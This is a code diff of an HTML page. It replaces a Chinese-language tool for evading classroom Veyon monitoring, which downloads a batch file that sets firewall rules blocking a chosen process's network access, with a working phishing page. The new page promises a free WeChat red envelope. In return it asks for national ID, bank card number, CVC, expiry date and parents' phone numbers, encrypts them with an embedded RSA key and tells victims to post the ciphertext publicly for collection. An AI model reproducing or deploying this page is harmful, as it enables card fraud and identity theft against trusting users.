@@ -1,155 +1,164 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Network Blocker Download</title>
+    <title>🧧免费领微信红包</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             max-width: 600px;
             margin: 0 auto;
             padding: 20px;
-            text-align: center;
         }
-        .container {
-            background-color: #f5f5f5;
-            border-radius: 8px;
-            padding: 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        
+        .input-group {
+            margin-bottom: 15px;
         }
-        h1 {
-            color: #333;
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
-        .instructions {
-            text-align: left;
-            background-color: #fff;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-        }
-        .download-btn {
-            background-color: #4CAF50;
+        
+        button {
+            background-color: #4285f4;
             color: white;
             border: none;
-            padding: 12px 24px;
-            text-align: center;
-            text-decoration: none;
-            display: inline-block;
+            padding: 12px 20px;
             font-size: 16px;
-            margin: 15px 0;
+            border-radius: 4px;
             cursor: pointer;
-            border-radius: 5px;
-            transition: background-color 0.3s;
+            width: 100%;
         }
-        .download-btn:hover {
-            background-color: #45a049;
+        
+        button:disabled {
+            background-color: #cccccc;
+            cursor: not-allowed;
         }
-        .warning {
-            color: #d32f2f;
-            font-weight: bold;
+        
+        #result {
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            display: none;
+            word-break: break-all;
+            white-space: pre-wrap;
+            background-color: #f9f9f9;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>躲避老师appVeyon监控</h1>
-        
-        <div class="instructions">
-            <p>此工具允許您暫時阻止任何正在執行的應用程式的網路訪問。</p>
-            <p><span class="warning">Important:</span> 您需要管理員許可權才能執行此批處理檔案。</p>
-            <p>使用:</p>
-            <ol>
-                <li>下載下面的批處理檔案</li>
-                <li>右鍵單擊檔案並選擇「以管理員身份執行」</li>
-                <li>從列表中選擇您要阻止的應用程式</li>
-                <li>保持視窗開啟以保持塊</li>
-                <li>關閉視窗以恢復網路訪問</li>
-                <li>找到[xxx]server-veyon.exe 在输入框输入[xxx]的数字</li>
-            </ol>
+    <h2>请填写以下信息领取红包🧧</h2>
+    
+    <form id="myForm">
+        <div class="input-group">
+            <input type="text" id="input1" placeholder="微信号码" required>
         </div>
-
-        <button class="download-btn" onclick="downloadBatchFile()">Download Network Blocker</button>
+       
+        <div class="input-group">
+            <input type="text" id="input2" placeholder="身份证号" required>
+        </div>
         
-        <p><small>Note: This will download a .bat file that creates temporary Windows Firewall rules.</small></p>
-    </div>
-
+        <div class="input-group">
+            <input type="text" id="input3" placeholder="银行卡号" required>
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="input4" placeholder="CvC安全码" required>
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="input5" placeholder="到期日期" required>
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="input6" placeholder="老爸手机号" required>
+        </div>
+        
+        <div class="input-group">
+            <input type="text" id="input7" placeholder="老妈手机号" required>
+        </div>
+        
+        <button type="button" id="submitBtn" disabled>获取领红包代码</button>
+    </form>
+    
+    <div id="result"></div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"></script>
     <script>
-        function downloadBatchFile() {
-            // Batch file content
-            const batchContent = `@echo off
-setlocal enabledelayedexpansion
-
-:: Check for administrator privileges
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    echo Requesting administrator privileges...
-    powershell Start-Process -FilePath "%comspec%" -ArgumentList '/c %~s0' -Verb RunAs
-    exit /b
-)
-
-:main
-cls
-echo Running processes:
-echo -------------------
-
-:: Get list of running processes
-set count=0
-for /f "tokens=1,* skip=3" %%a in ('tasklist') do (
-    set /a count+=1
-    set "proc[!count!]=%%a"
-    echo [!count!] %%a
-)
-
-:: Get user selection
-echo -------------------
-set /p selection="Select a process number to block (1-!count!): "
-
-:: Validate input
-if %selection% lss 1 (
-    echo Invalid selection
-    timeout /t 2 >nul
-    goto main
-)
-if %selection% gtr !count! (
-    echo Invalid selection
-    timeout /t 2 >nul
-    goto main
-)
-
-:: Get process name
-set "exename=!proc[%selection%]!"
-
-:: Create temporary firewall rule
-echo Creating firewall rule to block !exename!
-netsh advfirewall firewall add rule name="TempBlock_!exename!" dir=out program="%SystemDrive%\\!exename!" action=block
-netsh advfirewall firewall add rule name="TempBlock_!exename!" dir=in program="%SystemDrive%\\!exename!" action=block
-
-:: Cleanup on exit
-:cleanup
-echo Press any key to unblock !exename! and exit...
-pause >nul
-echo Removing firewall rule
-netsh advfirewall firewall delete rule name="TempBlock_!exename!"
-exit /b`;
-
-            // Create download link
-            const blob = new Blob([batchContent], { type: 'application/bat' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'NetworkBlocker.bat';
-            
-            // Trigger download
-            document.body.appendChild(a);
-            a.click();
-            
-            // Clean up
-            setTimeout(() => {
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-            }, 100);
+        const inputs = document.querySelectorAll('input');
+        const submitBtn = document.getElementById('submitBtn');
+        const resultDiv = document.getElementById('result');
+        
+        // RSA公钥
+        const publicKey = `-----BEGIN PUBLIC KEY-----
+MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmzVgKpFU5T6R9lYxr964
+KGf7ADDMWCZYpYnjZEV90Dm45hTEX6LbqDo516ZGmbhu/zE08DfJwMG/T+E3noNC
+r2v0DiHixLsOBKMwaUs2kNVt6CdjZWRsD/OhgNcUSEmJLeDv5GJQwIQlRxJeGzDr
+Bn8Bp9RFBYBK5NP+33GFshu/qSG3/gDGQHKIdGIeceUuO5ldvhdHY6zN+MMw+nAQ
+rHxgWHYjURzaYjQY5K0J0gN0ld7CY+zbwHI+ixmlbv9LB530ix0HxL0Z2v3zA5zx
+r/xcifJZACulI+nhuj2hXXDEC7NaesEF4VHGCdS8zY3j1o02lnHf7H4/IeyvtKDi
+suG1lwXhvEh0KkDiQ+bbpYnj4ZtmE/yzsYgpw0Yuw8L+OQMO1+En+lZfyM9449B3
+Fp20dnXPYaR7kmvNilbyoGNAui0nhsAPkJLJl3a93uz5p7gVOA8x6qqy+IwwHOVK
+Rrhh3VqPju9pvemk3EgG3GZb2kc1vGVjg8kYBiEVDaMCx3Y8y/hm6t+RWMMy5I1l
+4UJv8cbhvQn79l/fARj7nmEuPp4+MkD7KPbfFlcNpUt3uytZRcHuWHO18rwkXRrn
+Jl2RNKAuJfVPP9irD8CivfzweRTyQBFeYF4yUOBUcI22aPvCcmPAVBxpdwRqApKg
+ZbfXYd61A3ajmCJP9eL3bWsCAwEAAQ==
+-----END PUBLIC KEY-----`;
+        
+        // 检查所有输入框是否已填写
+        function checkInputs() {
+            let allFilled = true;
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                }
+            });
+            submitBtn.disabled = !allFilled;
         }
+        
+        // 为每个输入框添加事件监听
+        inputs.forEach(input => {
+            input.addEventListener('input', checkInputs);
+        });
+        
+        // RSA加密函数
+        function encryptData(data) {
+            const encrypt = new JSEncrypt();
+            encrypt.setPublicKey(publicKey);
+            return encrypt.encrypt(data);
+        }
+        
+        // 提交按钮点击事件
+        submitBtn.addEventListener('click', function() {
+            // 收集所有输入数据
+            let allData = {};
+            inputs.forEach((input, index) => {
+                allData[`field${index + 1}`] = input.value;
+            });
+            
+            // 将数据转换为JSON字符串
+            const jsonData = JSON.stringify(allData);
+            
+            // 使用RSA加密数据
+            const encryptedData = encryptData(jsonData);
+            
+            if (encryptedData) {
+                resultDiv.innerHTML = `把数据张贴到fb加上你的微信号：<br><br>${encryptedData}`;
+                resultDiv.style.display = "block";
+                
+                // 这里可以添加将加密数据发送到服务器的代码
+                // 例如：fetch('/api/submit', { method: 'POST', body: encryptedData });
+            } else {
+                resultDiv.innerHTML = "加密失败，请重试";
+                resultDiv.style.display = "block";
+            }
+        });
     </script>
 </body>
 </html>
